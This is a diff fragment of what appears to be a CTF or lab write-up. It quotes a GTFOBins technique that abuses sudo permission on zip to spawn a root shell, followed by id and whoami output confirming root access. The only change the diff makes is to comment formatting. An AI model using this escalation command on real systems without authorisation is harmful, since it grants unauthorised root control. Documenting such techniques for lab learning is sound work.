@@ -151,10 +151,10 @@ Another way to exploit zip binary is using gtfobins
 sudo /usr/bin/zip mktemp -T -TT 'bash #'
 ```
 And we are root
-# id
+#id
 id
 uid=0(root) gid=0(root) groups=0(root)
-# whoami
+#whoami
 whoami
 root
 	
